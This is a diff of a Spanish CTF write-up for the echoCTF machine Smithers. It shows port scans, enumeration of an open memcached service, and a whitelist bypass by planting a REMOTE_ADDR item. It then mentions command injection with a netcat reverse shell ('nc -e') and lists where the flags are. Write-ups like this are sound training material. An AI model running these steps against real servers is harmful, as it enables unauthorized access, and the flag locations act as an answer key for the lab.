@@ -6,11 +6,14 @@ tags:
 
 # Smithers <!-- omit from toc -->
 
+
 Write-up de la máquina Smithers de [echoCTF](https://echoCTF.red).
 
 ![Cover de Smithers](images/cover.png)
 
+
 ## Índice <!-- omit from toc -->
+
 
 - [Introducción](#introducción)
   - [Estadísticas](#estadísticas)
@@ -32,9 +35,12 @@ Write-up de la máquina Smithers de [echoCTF](https://echoCTF.red).
     - [Ejecución](#ejecución)
 - [Ubicación de banderas](#ubicación-de-banderas)
 
+
 ## Introducción
 
+
 ### Estadísticas
+
 
 | Característica | Descripción |
 |---|---|
@@ -44,11 +50,15 @@ Write-up de la máquina Smithers de [echoCTF](https://echoCTF.red).
 | Puntos | 8,100 pts (other/1,500 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, env/900 pts, root/1,500 pts) |
 | Descripción / Pistas |  Like Smithers this server will serve you well only if you manage to enter it's memcached store. The memcache service you just discovered on smithers.echocity-f.com/10.0.160.142:11211 has a hidden flag. |
 
+
 ## Reconocimiento
+
 
 ### Escaneo de host
 
+
 #### Escaneo completo de puertos
+
 
 ```bash
 ❯ nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET
@@ -73,7 +83,9 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 22.00 seconds
 ```
 
+
 #### Escaneo específico
+
 
 ```bash
 ❯ nmap -sCV -p 11211,10888 -oN nmap/targeted $BOX_TARGET
@@ -90,21 +102,29 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
 ```
 
+
 ## Enumeración
+
 
 ### Servicios
 
+
 #### http - 10888
 
+
 ##### Manual
+
 
 Al navegar al sitio se visualiza algún tipo de servicio que pone a disposición utilidades de red, pero de acuerdo con el mensaje que se arroja se puede suponer que para tener acceso se requiere estar en algún tipo de lista blanca que se encuentra configurada en el servidor. Tratando de hacer un bypass básico a esta validación se decidió jugar un poco con cabeceras como [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) entre otras, para ver si la respuesta por parte del servidor cambiaba de algún modo, sin éxito aparente.
 
 ![enum_1](./images/enum_1.png)
 
+
 #### memcached - 11211
 
+
 ##### Manual
+
 
 Siendo permitida la conexión directa mal socket mediante `netcat` se permite la obtención de datos existentes en el servidor mediante comandos propios de `memcached`, datos como versión, estatus, slabs, items, entre otros.
 
@@ -127,13 +147,18 @@ get <nombre_de_item> # Obtener información guardada de item
 
 Recalcando que para la obtención del `número de item` se puede extraer de la columna señalada del output generado por la obtención de los items.
 
+
 ## Explotación
+
 
 Habiendo encontrado que se puede exfiltrar información mediante la interacción con el servicio de `memcached` faltaría validar si también se puede configurar información en el servicio.
 
+
 ### Abuso de escritura de items en `memcached`
 
+
 #### Pasos previos | Preparación
+
 
 Dentro de la enumeración se encontró que la versión de `memcached` y la información contenida al navegar al sitio expuesto coincidía por lo que bajo la suposición de que estos dos interactuan entre sí y de no haber encontrado el item `REMOTE_ADDR` como lo indica el sitio web se puede intentar guardando este item con el valor de la IP correspondiente.
 
@@ -155,7 +180,9 @@ test
 
 Al tener problemas de interacción directa para configurar los valores se encontraron otras alternativas funcionales.
 
+
 ##### Método 1
+
 
 **Comando**
 
@@ -167,7 +194,9 @@ Al tener problemas de interacción directa para configurar los valores se encont
 2. Validación de existencia (cuando antes no se desplegaba el item 1).
 3. Obtención de valor de valor.
 
+
 ##### Método 2
+
 
 El paquete `libmemcached-tools` cuenta con utilidades para interactuar con conexiones de `memcached`. Haciendo uso de `memccp` se puede copiar un valor pasando como parámetro el archivo con el valor que se piensa ocupar y haciendo uso de `memcat` para la visualización de los valores de los items.
 
@@ -182,7 +211,9 @@ memccat --servers=10.0.100.142 REMOTE_ADDR
 
 *Referencia: https://www.hackingarticles.in/penetration-testing-on-memcached-server/*
 
+
 #### Ejecución
+
 
 Configurando la variable que concuerda con ambos servicios y añadiendo la asignada por la vpn el output de la página resulta diferente.
 
@@ -209,7 +240,9 @@ Al realizar la prueba para obtener una reverse shell con netcat usando `;nc -e /
 
 ![exploit_5](./images/exploit_5.png)
 
+
 ## Ubicación de banderas
+
 
 1. Llave - valor de `memcached`.
 2. `/var/lib/nginx/html/network-tools.php` x 3.
